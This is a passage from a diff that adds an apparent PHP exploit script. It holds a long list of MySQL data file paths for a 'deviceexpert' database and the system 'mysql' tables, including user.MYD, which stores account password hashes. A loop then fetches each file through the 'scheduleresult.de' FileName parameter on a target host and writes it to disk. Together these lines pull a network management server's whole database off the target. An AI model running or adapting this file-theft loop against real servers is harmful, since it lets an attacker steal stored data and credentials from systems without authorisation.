+'mysql/data/deviceexpert/message_keys.frm',
+'mysql/data/deviceexpert/message_templates.frm',
+'mysql/data/deviceexpert/modespecificserviceproviders.frm',
+'mysql/data/deviceexpert/module.frm',
+'mysql/data/deviceexpert/modulecontext.frm',
+'mysql/data/deviceexpert/motorolaswitch.frm',
+'mysql/data/deviceexpert/mssqlerrorcode.frm',
+'mysql/data/deviceexpert/mysqlerrorcode.frm',
+'mysql/data/deviceexpert/ncmapprovaldevicesrq.frm',
+'mysql/data/deviceexpert/ncmapprovalrequest.frm',
+'mysql/data/deviceexpert/ncmapprovalrequestaudit.frm',
+'mysql/data/deviceexpert/ncmapprovalusers.frm',
+'mysql/data/deviceexpert/ncmattributesregex.frm',
+'mysql/data/deviceexpert/ncmbackupstateholder.frm',
+'mysql/data/deviceexpert/ncmbulkexecution.frm',
+'mysql/data/deviceexpert/ncmbulkexecutionstatus.frm',
+'mysql/data/deviceexpert/ncmchangemgmtrule.frm',
+'mysql/data/deviceexpert/ncmclientoperationstatus.frm',
+'mysql/data/deviceexpert/ncmclientprops.frm',
+'mysql/data/deviceexpert/ncmclientresourcestatus.frm',
+'mysql/data/deviceexpert/ncmclientschedulestatus.frm',
+'mysql/data/deviceexpert/ncmclientstatuscmr.frm',
+'mysql/data/deviceexpert/ncmcliloginparams.frm',
+'mysql/data/deviceexpert/ncmcmactions.frm',
+'mysql/data/deviceexpert/ncmcmavaactions.frm',
+'mysql/data/deviceexpert/ncmcmavaconditions.frm',
+'mysql/data/deviceexpert/ncmcmemailactioninfo.frm',
+'mysql/data/deviceexpert/ncmcmrollbackactioninfo.frm',
+'mysql/data/deviceexpert/ncmcmruledgmap.frm',
+'mysql/data/deviceexpert/ncmcmruleresourcemap.frm',
+'mysql/data/deviceexpert/ncmcmtrapactioninfo.frm',
+'mysql/data/deviceexpert/ncmcolumndetails.frm',
+'mysql/data/deviceexpert/ncmcommandmapping.frm',
+'mysql/data/deviceexpert/ncmcommandregex.frm',
+'mysql/data/deviceexpert/ncmcompliancecustomreports.frm',
+'mysql/data/deviceexpert/ncmcompliancepolicy.frm',
+'mysql/data/deviceexpert/ncmcompliancereportcri.frm',
+'mysql/data/deviceexpert/ncmcompliancerule.frm',
+'mysql/data/deviceexpert/ncmcomprulecriteria.frm',
+'mysql/data/deviceexpert/ncmcomprulegroup.frm',
+'mysql/data/deviceexpert/ncmconfigautomation.frm',
+'mysql/data/deviceexpert/ncmconfigautomationaudit.frm',
+'mysql/data/deviceexpert/ncmconfigautomationinput.frm',
+'mysql/data/deviceexpert/ncmconfigautomationquery.frm',
+'mysql/data/deviceexpert/ncmconfigdownloadinput.frm',
+'mysql/data/deviceexpert/ncmconfigdownloadrq.frm',
+'mysql/data/deviceexpert/ncmconfigfile.frm',
+'mysql/data/deviceexpert/ncmconfigfilebaselineversion.frm',
+'mysql/data/deviceexpert/ncmconfigfileformat.frm',
+'mysql/data/deviceexpert/ncmconfigfilemaxversion.frm',
+'mysql/data/deviceexpert/ncmconfigfileparser.frm',
+'mysql/data/deviceexpert/ncmconfigfileversion.frm',
+'mysql/data/deviceexpert/ncmconfigfileversionlabel.frm',
+'mysql/data/deviceexpert/ncmconfigupload.frm',
+'mysql/data/deviceexpert/ncmcredentialgroup.frm',
+'mysql/data/deviceexpert/ncmcredentialprofilevalue.frm',
+'mysql/data/deviceexpert/ncmcredentialstaticvalue.frm',
+'mysql/data/deviceexpert/ncmcredentialvalidity.frm',
+'mysql/data/deviceexpert/ncmcredentialvalue.frm',
+'mysql/data/deviceexpert/ncmcredentialvaluedef.frm',
+'mysql/data/deviceexpert/ncmcustomcolumndetails.frm',
+'mysql/data/deviceexpert/ncmcustomreports.frm',
+'mysql/data/deviceexpert/ncmcustomtimedc.frm',
+'mysql/data/deviceexpert/ncmdevicecredential.frm',
+'mysql/data/deviceexpert/ncmdevicecriteria.frm',
+'mysql/data/deviceexpert/ncmdeviceeol.frm',
+'mysql/data/deviceexpert/ncmdeviceexdcriteria.frm',
+'mysql/data/deviceexpert/ncmdevicegroup.frm',
+'mysql/data/deviceexpert/ncmdevicegroupdc.frm',
+'mysql/data/deviceexpert/ncmdevicenoteol.frm',
+'mysql/data/deviceexpert/ncmdeviceoperation.frm',
+'mysql/data/deviceexpert/ncmdeviceostyperegex.frm',
+'mysql/data/deviceexpert/ncmdeviceosverregex.frm',
+'mysql/data/deviceexpert/ncmdevicepersonality.frm',
+'mysql/data/deviceexpert/ncmdevicesysoid.frm',
+'mysql/data/deviceexpert/ncmdevicetemplate.frm',
+'mysql/data/deviceexpert/ncmdisasterexecaudit.frm',
+'mysql/data/deviceexpert/ncmdiscnotsupportedmodels.frm',
+'mysql/data/deviceexpert/ncmdiscoverystateholder.frm',
+'mysql/data/deviceexpert/ncmdiscoverytask.frm',
+'mysql/data/deviceexpert/ncmdiscoverytaskmapper.frm',
+'mysql/data/deviceexpert/ncmdisplaypersonalityview.frm',
+'mysql/data/deviceexpert/ncmdownloadschedulerq.frm',
+'mysql/data/deviceexpert/ncmdraft.frm',
+'mysql/data/deviceexpert/ncmdraftdownloadinput.frm',
+'mysql/data/deviceexpert/ncmdraftdownloadrq.frm',
+'mysql/data/deviceexpert/ncmdraftversion.frm',
+'mysql/data/deviceexpert/ncmemail.frm',
+'mysql/data/deviceexpert/ncmemailrecipients.frm',
+'mysql/data/deviceexpert/ncmemailrecipientsdr.frm',
+'mysql/data/deviceexpert/ncmerrorcode.frm',
+'mysql/data/deviceexpert/ncmexcludecriteria.frm',
+'mysql/data/deviceexpert/ncmexecutiongroup.frm',
+'mysql/data/deviceexpert/ncmexecutiongroupinfo.frm',
+'mysql/data/deviceexpert/ncmfdbtable.frm',
+'mysql/data/deviceexpert/ncmfilecontentcorrection.frm',
+'mysql/data/deviceexpert/ncmimageupgradetaskinput.frm',
+'mysql/data/deviceexpert/ncmjespaconfig.frm',
+'mysql/data/deviceexpert/ncmlabel.frm',
+'mysql/data/deviceexpert/ncmlabeldownloadinput.frm',
+'mysql/data/deviceexpert/ncmlabeldownloadrq.frm',
+'mysql/data/deviceexpert/ncmmibselection.frm',
+'mysql/data/deviceexpert/ncmoperation.frm',
+'mysql/data/deviceexpert/ncmoperationaudit.frm',
+'mysql/data/deviceexpert/ncmoperationauditstatusimage.frm',
+'mysql/data/deviceexpert/ncmoperationstateholder.frm',
+'mysql/data/deviceexpert/ncmoperationtimeout.frm',
+'mysql/data/deviceexpert/ncmoperationtofilemap.frm',
+'mysql/data/deviceexpert/ncmpershardwareconversion.frm',
+'mysql/data/deviceexpert/ncmpersonality.frm',
+'mysql/data/deviceexpert/ncmpersonalitycmdregex.frm',
+'mysql/data/deviceexpert/ncmpersonalitymapper.frm',
+'mysql/data/deviceexpert/ncmpolicydgmap.frm',
+'mysql/data/deviceexpert/ncmpolicyresourcemap.frm',
+'mysql/data/deviceexpert/ncmpolicytorulegrpmap.frm',
+'mysql/data/deviceexpert/ncmpollingcriteria.frm',
+'mysql/data/deviceexpert/ncmpollingdevicegroup.frm',
+'mysql/data/deviceexpert/ncmppmhandling.frm',
+'mysql/data/deviceexpert/ncmpredefinedtimedc.frm',
+'mysql/data/deviceexpert/ncmprofileprops.frm',
+'mysql/data/deviceexpert/ncmprotocol.frm',
+'mysql/data/deviceexpert/ncmprotocolcombination.frm',
+'mysql/data/deviceexpert/ncmradiusconfig.frm',
+'mysql/data/deviceexpert/ncmreadfromresponse.frm',
+'mysql/data/deviceexpert/ncmrebranding.frm',
+'mysql/data/deviceexpert/ncmresource.frm',
+'mysql/data/deviceexpert/ncmresourcecompstatus.frm',
+'mysql/data/deviceexpert/ncmresourceconfigfile.frm',
+'mysql/data/deviceexpert/ncmresourcecustomcolumn.frm',
+'mysql/data/deviceexpert/ncmresourcedraft.frm',
+'mysql/data/deviceexpert/ncmresourceinterfaceinfo.frm',
+'mysql/data/deviceexpert/ncmresourcepolicymap.frm',
+'mysql/data/deviceexpert/ncmresourcergroupmap.frm',
+'mysql/data/deviceexpert/ncmresourcerulemap.frm',
+'mysql/data/deviceexpert/ncmresourcerulestatus.frm',
+'mysql/data/deviceexpert/ncmresourcesconfconflict.frm',
+'mysql/data/deviceexpert/ncmresourcesimagehistory.frm',
+'mysql/data/deviceexpert/ncmresourcesinfo.frm',
+'mysql/data/deviceexpert/ncmresourcesmibinfo.frm',
+'mysql/data/deviceexpert/ncmresourcesoperation.frm',
+'mysql/data/deviceexpert/ncmresourcesprotocol.frm',
+'mysql/data/deviceexpert/ncmresourcesprotocollist.frm',
+'mysql/data/deviceexpert/ncmresourcestateholder.frm',
+'mysql/data/deviceexpert/ncmresourcesuserinput.frm',
+'mysql/data/deviceexpert/ncmresourcetoservernatip.frm',
+'mysql/data/deviceexpert/ncmrulegrouptorulemap.frm',
+'mysql/data/deviceexpert/ncmschdownloadcriteria.frm',
+'mysql/data/deviceexpert/ncmschdownloaddevicegroup.frm',
+'mysql/data/deviceexpert/ncmschdownloadtaskinput.frm',
+'mysql/data/deviceexpert/ncmschedule.frm',
+'mysql/data/deviceexpert/ncmschedulediscovery.frm',
+'mysql/data/deviceexpert/ncmschedulereport.frm',
+'mysql/data/deviceexpert/ncmscheduleresultaudit.frm',
+'mysql/data/deviceexpert/ncmschedulert.frm',
+'mysql/data/deviceexpert/ncmschedulerttime.frm',
+'mysql/data/deviceexpert/ncmscheduletemplate.frm',
+'mysql/data/deviceexpert/ncmscriptexecution.frm',
+'mysql/data/deviceexpert/ncmsharedprofile.frm',
+'mysql/data/deviceexpert/ncmshowcommands.frm',
+'mysql/data/deviceexpert/ncmshowcommandvendormap.frm',
+'mysql/data/deviceexpert/ncmshowcommexecgrpinfo.frm',
+'mysql/data/deviceexpert/ncmsnmpinterface.frm',
+'mysql/data/deviceexpert/ncmsoftwareimage.frm',
+'mysql/data/deviceexpert/ncmspmbasemac.frm',
+'mysql/data/deviceexpert/ncmsupportedprotocol.frm',
+'mysql/data/deviceexpert/ncmswitchportadminstatus.frm',
+'mysql/data/deviceexpert/ncmswitchportstatus.frm',
+'mysql/data/deviceexpert/ncmswitchportsummary.frm',
+'mysql/data/deviceexpert/ncmswitchportvlan.frm',
+'mysql/data/deviceexpert/ncmsyslogfrwdip.frm',
+'mysql/data/deviceexpert/ncmsyslogstatecheckerregex.frm',
+'mysql/data/deviceexpert/ncmsyslogtrackingstate.frm',
+'mysql/data/deviceexpert/ncmtemplate.frm',
+'mysql/data/deviceexpert/ncmtftpscpsyslogipaddress.frm',
+'mysql/data/deviceexpert/ncmuserdevicegroupinfo.frm',
+'mysql/data/deviceexpert/ncmuserdevicesinfo.frm',
+'mysql/data/deviceexpert/ncmuserinput.frm',
+'mysql/data/deviceexpert/ncmuserinputkey.frm',
+'mysql/data/deviceexpert/ncmuserviewdc.frm',
+'mysql/data/deviceexpert/ncmvendor.frm',
+'mysql/data/deviceexpert/ncmvendordevice.frm',
+'mysql/data/deviceexpert/ncmvendormib.frm',
+'mysql/data/deviceexpert/ncmvendorsyslogtrackinglevel.frm',
+'mysql/data/deviceexpert/ncmversion.frm',
+'mysql/data/deviceexpert/ncmversiondownloadinput.frm',
+'mysql/data/deviceexpert/ncmversiondownloadrq.frm',
+'mysql/data/deviceexpert/ncmviewdc.frm',
+'mysql/data/deviceexpert/ncm_adgroupsyncdetails.frm',
+'mysql/data/deviceexpert/ncm_adoudetails.frm',
+'mysql/data/deviceexpert/ncm_adsyncdetails.frm',
+'mysql/data/deviceexpert/ncm_configuration.frm',
+'mysql/data/deviceexpert/ncm_ldapusers.frm',
+'mysql/data/deviceexpert/ncm_taskaudit.frm',
+'mysql/data/deviceexpert/ncm_useraudit.frm',
+'mysql/data/deviceexpert/ncm_userdetails.frm',
+'mysql/data/deviceexpert/ncm_usergroup.frm',
+'mysql/data/deviceexpert/ncm_usergroupmembers.frm',
+'mysql/data/deviceexpert/ncm_usergroupoption.frm',
+'mysql/data/deviceexpert/necomponent.frm',
+'mysql/data/deviceexpert/neconnection.frm',
+'mysql/data/deviceexpert/necontext.frm',
+'mysql/data/deviceexpert/nedetails.frm',
+'mysql/data/deviceexpert/neequipment.frm',
+'mysql/data/deviceexpert/neequipmentholder.frm',
+'mysql/data/deviceexpert/neinterface.frm',
+'mysql/data/deviceexpert/neinterfacedetails.frm',
+'mysql/data/deviceexpert/nelink.frm',
+'mysql/data/deviceexpert/nenetwork.frm',
+'mysql/data/deviceexpert/neport.frm',
+'mysql/data/deviceexpert/neportdetails.frm',
+'mysql/data/deviceexpert/neservice.frm',
+'mysql/data/deviceexpert/neservicedetails.frm',
+'mysql/data/deviceexpert/netfdbtable.frm',
+'mysql/data/deviceexpert/netgearswitch.frm',
+'mysql/data/deviceexpert/netscreenfirewall.frm',
+'mysql/data/deviceexpert/netsd3800.frm',
+'mysql/data/deviceexpert/nettopoconfiguration.frm',
+'mysql/data/deviceexpert/network.frm',
+'mysql/data/deviceexpert/networkcomponentconfiguration.frm',
+'mysql/data/deviceexpert/networkcomponentmatchcriteria.frm',
+'mysql/data/deviceexpert/networkconfiguration.frm',
+'mysql/data/deviceexpert/networkelement.frm',
+'mysql/data/deviceexpert/networkelementconfiguration.frm',
+'mysql/data/deviceexpert/networktopology.frm',
+'mysql/data/deviceexpert/nmapdetails.frm',
+'mysql/data/deviceexpert/nortelbaystackswitch.frm',
+'mysql/data/deviceexpert/nortelconvpnrouter.frm',
+'mysql/data/deviceexpert/nortelpassportswitch.frm',
+'mysql/data/deviceexpert/nortelpwrswitch.frm',
+'mysql/data/deviceexpert/nortelswitchmodule.frm',
+'mysql/data/deviceexpert/numeric_expressions.frm',
+'mysql/data/deviceexpert/numeric_rank_vars.frm',
+'mysql/data/deviceexpert/num_const_opr_expr.frm',
+'mysql/data/deviceexpert/num_decimal_opr_expr.frm',
+'mysql/data/deviceexpert/num_expr_opr_const.frm',
+'mysql/data/deviceexpert/num_expr_opr_decimal.frm',
+'mysql/data/deviceexpert/num_expr_opr_expr.frm',
+'mysql/data/deviceexpert/objectidentifiercolumns.frm',
+'mysql/data/deviceexpert/openviewincontentarea.frm',
+'mysql/data/deviceexpert/operationauditrecord.frm',
+'mysql/data/deviceexpert/operations.frm',
+'mysql/data/deviceexpert/oracleerrorcode.frm',
+'mysql/data/deviceexpert/out_template_vars.frm',
+'mysql/data/deviceexpert/out_var_instances.frm',
+'mysql/data/deviceexpert/packetshaper.frm',
+'mysql/data/deviceexpert/paloaltofirewall.frm',
+'mysql/data/deviceexpert/parent_class_expr.frm',
+'mysql/data/deviceexpert/parser.frm',
+'mysql/data/deviceexpert/par_char_class_expr.frm',
+'mysql/data/deviceexpert/paths.frm',
+'mysql/data/deviceexpert/pattern_dataobj_vars.frm',
+'mysql/data/deviceexpert/pattern_expressions.frm',
+'mysql/data/deviceexpert/pattern_template_vars.frm',
+'mysql/data/deviceexpert/pattern_to_char_expr.frm',
+'mysql/data/deviceexpert/pattern_to_str_expr.frm',
+'mysql/data/deviceexpert/pattern_variables.frm',
+'mysql/data/deviceexpert/pdfuicomponent.frm',
+'mysql/data/deviceexpert/pdfviewconfig.frm',
+'mysql/data/deviceexpert/periodic.frm',
+'mysql/data/deviceexpert/personalityconfiguration.frm',
+'mysql/data/deviceexpert/personalizedviewmap.frm',
+'mysql/data/deviceexpert/pgsqlerrorcode.frm',
+'mysql/data/deviceexpert/pkdefinition.frm',
+'mysql/data/deviceexpert/pointers_in_path.frm',
+'mysql/data/deviceexpert/pointer_fk_attributes.frm',
+'mysql/data/deviceexpert/pre_def_char_class.frm',
+'mysql/data/deviceexpert/printer.frm',
+'mysql/data/deviceexpert/print_log.frm',
+'mysql/data/deviceexpert/print_log_expr.frm',
+'mysql/data/deviceexpert/print_log_relvars.frm',
+'mysql/data/deviceexpert/print_task.frm',
+'mysql/data/deviceexpert/print_task_expr.frm',
+'mysql/data/deviceexpert/print_task_relvar.frm',
+'mysql/data/deviceexpert/projection_operator.frm',
+'mysql/data/deviceexpert/proj_opr_output.frm',
+'mysql/data/deviceexpert/protocolinformation.frm',
+'mysql/data/deviceexpert/proximaccesspoint.frm',
+'mysql/data/deviceexpert/quantifier.frm',
+'mysql/data/deviceexpert/quantifier_operator.frm',
+'mysql/data/deviceexpert/quantifier_range.frm',
+'mysql/data/deviceexpert/quotation.frm',
+'mysql/data/deviceexpert/radwarelinkproofswitch.frm',
+'mysql/data/deviceexpert/radwareswitch.frm',
+'mysql/data/deviceexpert/rangevalues.frm',
+'mysql/data/deviceexpert/record.frm',
+'mysql/data/deviceexpert/recordconversion.frm',
+'mysql/data/deviceexpert/recordinformation.frm',
+'mysql/data/deviceexpert/redbackrouter.frm',
+'mysql/data/deviceexpert/reg_expr_split_list.frm',
+'mysql/data/deviceexpert/relationalcriteria.frm',
+'mysql/data/deviceexpert/relations.frm',
+'mysql/data/deviceexpert/relations_in_path.frm',
+'mysql/data/deviceexpert/relvars.frm',
+'mysql/data/deviceexpert/relvars_to_tables.frm',
+'mysql/data/deviceexpert/relvars_to_views.frm',
+'mysql/data/deviceexpert/rename_operator.frm',
+'mysql/data/deviceexpert/replace_reg_expr_str.frm',
+'mysql/data/deviceexpert/resourceconnection.frm',
+'mysql/data/deviceexpert/resourcecontainee.frm',
+'mysql/data/deviceexpert/resourcecontainer.frm',
+'mysql/data/deviceexpert/resources.frm',
+'mysql/data/deviceexpert/resourcestreenode.frm',
+'mysql/data/deviceexpert/resources_pidx.frm',
+'mysql/data/deviceexpert/resource_location.frm',
+'mysql/data/deviceexpert/responsegroups.frm',
+'mysql/data/deviceexpert/riverbedsteelhead.frm',
+'mysql/data/deviceexpert/router.frm',
+'mysql/data/deviceexpert/rules.frm',
+'mysql/data/deviceexpert/rules_to_statements.frm',
+'mysql/data/deviceexpert/sb_applications.frm',
+'mysql/data/deviceexpert/schedule.frm',
+'mysql/data/deviceexpert/scheduledreports.frm',
+'mysql/data/deviceexpert/scheduledtask_retry.frm',
+'mysql/data/deviceexpert/scheduled_task.frm',
+'mysql/data/deviceexpert/schedule_audit.frm',
+'mysql/data/deviceexpert/schedule_view.frm',
+'mysql/data/deviceexpert/schtemplatevariables.frm',
+'mysql/data/deviceexpert/selectcolumn.frm',
+'mysql/data/deviceexpert/selection_operator.frm',
+'mysql/data/deviceexpert/selectquery.frm',
+'mysql/data/deviceexpert/selectsqlstring.frm',
+'mysql/data/deviceexpert/selecttable.frm',
+'mysql/data/deviceexpert/seqgenstate.frm',
+'mysql/data/deviceexpert/server.frm',
+'mysql/data/deviceexpert/serverdetails.frm',
+'mysql/data/deviceexpert/serverdetectconfiguration.frm',
+'mysql/data/deviceexpert/serverserviceproviders.frm',
+'mysql/data/deviceexpert/serverstatus.frm',
+'mysql/data/deviceexpert/service.frm',
+'mysql/data/deviceexpert/serviceconfiguration.frm',
+'mysql/data/deviceexpert/servicegroup.frm',
+'mysql/data/deviceexpert/serviceheader.frm',
+'mysql/data/deviceexpert/serviceproperties.frm',
+'mysql/data/deviceexpert/servicerelation.frm',
+'mysql/data/deviceexpert/setcommonindexoidparam.frm',
+'mysql/data/deviceexpert/setindexoidparam.frm',
+'mysql/data/deviceexpert/severitynode.frm',
+'mysql/data/deviceexpert/simple_class_expr.frm',
+'mysql/data/deviceexpert/slimline.frm',
+'mysql/data/deviceexpert/snmpconnectionspec.frm',
+'mysql/data/deviceexpert/snmpgetparam.frm',
+'mysql/data/deviceexpert/snmpgetrecord.frm',
+'mysql/data/deviceexpert/snmpinteractionspec.frm',
+'mysql/data/deviceexpert/snmpsecuritymodelparams.frm',
+'mysql/data/deviceexpert/snmpsetparam.frm',
+'mysql/data/deviceexpert/snmpsetrecord.frm',
+'mysql/data/deviceexpert/snmpv3connectionspec.frm',
+'mysql/data/deviceexpert/sortcolumn.frm',
+'mysql/data/deviceexpert/sphereonswitch.frm',
+'mysql/data/deviceexpert/sqintreequery.frm',
+'mysql/data/deviceexpert/start_end_count.frm',
+'mysql/data/deviceexpert/statements.frm',
+'mysql/data/deviceexpert/staticdataconversion.frm',
+'mysql/data/deviceexpert/staticmultivaluedcolumn.frm',
+'mysql/data/deviceexpert/staticmultivaluedconversion.frm',
+'mysql/data/deviceexpert/statusinfo.frm',
+'mysql/data/deviceexpert/statuspropagatecriteria.frm',
+'mysql/data/deviceexpert/statusupdatecriteria.frm',
+'mysql/data/deviceexpert/storagedetails.frm',
+'mysql/data/deviceexpert/string_dataobj_vars.frm',
+'mysql/data/deviceexpert/string_expressions.frm',
+'mysql/data/deviceexpert/string_list.frm',
+'mysql/data/deviceexpert/string_matcher_group.frm',
+'mysql/data/deviceexpert/string_template_vars.frm',
+'mysql/data/deviceexpert/string_variables.frm',
+'mysql/data/deviceexpert/str_const_opr_expr.frm',
+'mysql/data/deviceexpert/str_dataobj_expr.frm',
+'mysql/data/deviceexpert/str_deriv_int_vars.frm',
+'mysql/data/deviceexpert/str_expr_opr_const.frm',
+'mysql/data/deviceexpert/str_expr_opr_expr.frm',
+'mysql/data/deviceexpert/str_expr_to_str.frm',
+'mysql/data/deviceexpert/str_obj_expr.frm',
+'mysql/data/deviceexpert/subject_keys.frm',
+'mysql/data/deviceexpert/switch.frm',
+'mysql/data/deviceexpert/syslogcollectors.frm',
+'mysql/data/deviceexpert/systemdetails.frm',
+'mysql/data/deviceexpert/systemtemplatehandler.frm',
+'mysql/data/deviceexpert/tabledetails.frm',
+'mysql/data/deviceexpert/tabledsmap.frm',
+'mysql/data/deviceexpert/tablesintree.frm',
+'mysql/data/deviceexpert/tabletemplatefiles.frm',
+'mysql/data/deviceexpert/tableviewsortcolumn.frm',
+'mysql/data/deviceexpert/taskengine_task.frm',
+'mysql/data/deviceexpert/tasks_to_exceptions.frm',
+'mysql/data/deviceexpert/task_conf.frm',
+'mysql/data/deviceexpert/task_input.frm',
+'mysql/data/deviceexpert/task_instances.frm',
+'mysql/data/deviceexpert/task_owner.frm',
+'mysql/data/deviceexpert/task_templates.frm',
+'mysql/data/deviceexpert/tcpportlist.frm',
+'mysql/data/deviceexpert/templatefiles.frm',
+'mysql/data/deviceexpert/templates.frm',
+'mysql/data/deviceexpert/templates_to_relvars.frm',
+'mysql/data/deviceexpert/templateviewparams.frm',
+'mysql/data/deviceexpert/template_constants.frm',
+'mysql/data/deviceexpert/template_data.frm',
+'mysql/data/deviceexpert/template_variables.frm',
+'mysql/data/deviceexpert/tftpconnectionspec.frm',
+'mysql/data/deviceexpert/tftpinteractionspec.frm',
+'mysql/data/deviceexpert/tftpipparams.frm',
+'mysql/data/deviceexpert/tftprecord.frm',
+'mysql/data/deviceexpert/tftpserverparams.frm',
+'mysql/data/deviceexpert/theme.frm',
+'mysql/data/deviceexpert/themeattributesmapping.frm',
+'mysql/data/deviceexpert/threadpool.frm',
+'mysql/data/deviceexpert/threecomswitch.frm',
+'mysql/data/deviceexpert/tiledview.frm',
+'mysql/data/deviceexpert/time_agg_vars.frm',
+'mysql/data/deviceexpert/time_constants.frm',
+'mysql/data/deviceexpert/time_dataobj_vars.frm',
+'mysql/data/deviceexpert/time_expressions.frm',
+'mysql/data/deviceexpert/time_expr_to_time.frm',
+'mysql/data/deviceexpert/time_operator_delta.frm',
+'mysql/data/deviceexpert/time_template_vars.frm',
+'mysql/data/deviceexpert/time_variables.frm',
+'mysql/data/deviceexpert/tmpcolumnrenderer.frm',
+'mysql/data/deviceexpert/tmpviewcolumn.frm',
+'mysql/data/deviceexpert/tmpviewcriteria.frm',
+'mysql/data/deviceexpert/tmpviewdetails.frm',
+'mysql/data/deviceexpert/topolockingconfig.frm',
+'mysql/data/deviceexpert/topotreepath.frm',
+'mysql/data/deviceexpert/to_address.frm',
+'mysql/data/deviceexpert/transportparams.frm',
+'mysql/data/deviceexpert/transportwirelessrouter.frm',
+'mysql/data/deviceexpert/trans_closure_attributes.frm',
+'mysql/data/deviceexpert/trans_closure_operator.frm',
+'mysql/data/deviceexpert/trans_closure_weights.frm',
+'mysql/data/deviceexpert/trans_closure_weight_expr.frm',
+'mysql/data/deviceexpert/treedefinition.frm',
+'mysql/data/deviceexpert/treeidentifiercolumns.frm',
+'mysql/data/deviceexpert/treequery.frm',
+'mysql/data/deviceexpert/treequeryidentifiercolumns.frm',
+'mysql/data/deviceexpert/typeconfiguration.frm',
+'mysql/data/deviceexpert/typegroup.frm',
+'mysql/data/deviceexpert/typematchcriteria.frm',
+'mysql/data/deviceexpert/typerecordcomponent.frm',
+'mysql/data/deviceexpert/typerecordconfiguration.frm',
+'mysql/data/deviceexpert/typerelation.frm',
+'mysql/data/deviceexpert/udef_char_cls_const.frm',
+'mysql/data/deviceexpert/udef_char_cls_expr.frm',
+'mysql/data/deviceexpert/udef_class_range.frm',
+'mysql/data/deviceexpert/udef_expr_opr_expr.frm',
+'mysql/data/deviceexpert/uicomponent.frm',
+'mysql/data/deviceexpert/uicomponent_pidx.frm',
+'mysql/data/deviceexpert/uinavigationconfig.frm',
+'mysql/data/deviceexpert/uniquekeydefinition.frm',
+'mysql/data/deviceexpert/update_index_vars.frm',
+'mysql/data/deviceexpert/update_template_vars.frm',
+'mysql/data/deviceexpert/upd_dataobj_var_task.frm',
+'mysql/data/deviceexpert/upd_row_task_template.frm',
+'mysql/data/deviceexpert/user_def_char_class.frm',
+'mysql/data/deviceexpert/usmparams.frm',
+'mysql/data/deviceexpert/usmtable.frm',
+'mysql/data/deviceexpert/uvhvalues.frm',
+'mysql/data/deviceexpert/vacmaccesstable.frm',
+'mysql/data/deviceexpert/vacmcontexttable.frm',
+'mysql/data/deviceexpert/vacmsecuritytogrouptable.frm',
+'mysql/data/deviceexpert/vacmviewtreefamilytable.frm',
+'mysql/data/deviceexpert/validationfiles.frm',
+'mysql/data/deviceexpert/vanguardrouter.frm',
+'mysql/data/deviceexpert/viewconfiguration.frm',
+'mysql/data/deviceexpert/viewconfiguration_pidx.frm',
+'mysql/data/deviceexpert/viewcustomizer.frm',
+'mysql/data/deviceexpert/viewdatatablemapping.frm',
+'mysql/data/deviceexpert/views.frm',
+'mysql/data/deviceexpert/views_pidx.frm',
+'mysql/data/deviceexpert/watchguardfirewall.frm',
+'mysql/data/deviceexpert/webmenuitem.frm',
+'mysql/data/deviceexpert/webuicomponent.frm',
+'mysql/data/deviceexpert/webviewconfig.frm',
+'mysql/data/deviceexpert/wf_task_variables.frm',
+'mysql/data/deviceexpert/while_loop_tasks.frm',
+'mysql/data/deviceexpert/workengine_config.frm',
+'mysql/data/deviceexpert/workflow_instances.frm',
+'mysql/data/deviceexpert/workflow_statements.frm',
+'mysql/data/deviceexpert/workflow_task.frm',
+'mysql/data/deviceexpert/workflow_templates.frm',
+'mysql/data/deviceexpert/workflow_template_task.frm',
+'mysql/data/deviceexpert/workflow_type.frm',
+'mysql/data/deviceexpert/workflow_unit.frm',
+'mysql/data/deviceexpert/workflow_unit_pidx.frm',
+'mysql/data/deviceexpert/working_hours.frm',
+'mysql/data/deviceexpert/yamaharouter.frm',
+'mysql/data/deviceexpert/yseriescolumn.frm',
+'mysql/data/deviceexpert/zxrrouter.frm',
+'mysql/data/mysql/columns_priv.frm',
+'mysql/data/mysql/columns_priv.MYD',
+'mysql/data/mysql/columns_priv.MYI',
+'mysql/data/mysql/db.frm',
+'mysql/data/mysql/db.MYD',
+'mysql/data/mysql/db.MYI',
+'mysql/data/mysql/func.frm',
+'mysql/data/mysql/func.MYD',
+'mysql/data/mysql/func.MYI',
+'mysql/data/mysql/help_category.frm',
+'mysql/data/mysql/help_category.MYD',
+'mysql/data/mysql/help_category.MYI',
+'mysql/data/mysql/help_keyword.frm',
+'mysql/data/mysql/help_keyword.MYD',
+'mysql/data/mysql/help_keyword.MYI',
+'mysql/data/mysql/help_relation.frm',
+'mysql/data/mysql/help_relation.MYD',
+'mysql/data/mysql/help_relation.MYI',
+'mysql/data/mysql/help_topic.frm',
+'mysql/data/mysql/help_topic.MYD',
+'mysql/data/mysql/help_topic.MYI',
+'mysql/data/mysql/host.frm',
+'mysql/data/mysql/host.MYD',
+'mysql/data/mysql/host.MYI',
+'mysql/data/mysql/proc.frm',
+'mysql/data/mysql/proc.MYD',
+'mysql/data/mysql/proc.MYI',
+'mysql/data/mysql/procs_priv.frm',
+'mysql/data/mysql/procs_priv.MYD',
+'mysql/data/mysql/procs_priv.MYI',
+'mysql/data/mysql/tables_priv.frm',
+'mysql/data/mysql/tables_priv.MYD',
+'mysql/data/mysql/tables_priv.MYI',
+'mysql/data/mysql/time_zone.frm',
+'mysql/data/mysql/time_zone.MYD',
+'mysql/data/mysql/time_zone.MYI',
+'mysql/data/mysql/time_zone_leap_second.frm',
+'mysql/data/mysql/time_zone_leap_second.MYD',
+'mysql/data/mysql/time_zone_leap_second.MYI',
+'mysql/data/mysql/time_zone_name.frm',
+'mysql/data/mysql/time_zone_name.MYD',
+'mysql/data/mysql/time_zone_name.MYI',
+'mysql/data/mysql/time_zone_transition.frm',
+'mysql/data/mysql/time_zone_transition.MYD',
+'mysql/data/mysql/time_zone_transition.MYI',
+'mysql/data/mysql/time_zone_transition_type.frm',
+'mysql/data/mysql/time_zone_transition_type.MYD',
+'mysql/data/mysql/time_zone_transition_type.MYI',
+'mysql/data/mysql/user.frm',
+'mysql/data/mysql/user.MYD',
+'mysql/data/mysql/user.MYI',
+'mysql/share/english',
+'mysql/share/errmsg.txt',
+'mysql/share/english/errmsg.sys',
+'mysql/tmp/ib2',
+'mysql/tmp/ib3',
+'mysql/tmp/ib4',
+'mysql/tmp/ib5',
+'mysql/tmp/ib6');
+
+for ($i=0; $i<count($path); $i++){
+    $url = "https://$host:$port/scheduleresult.de/?FileName=".urlencode($path[$i]);
+    $out = _s($url, 1, "", "");
+    @file_put_contents($path[$i],$out);
+    echo ".";
+}
+} else
+{
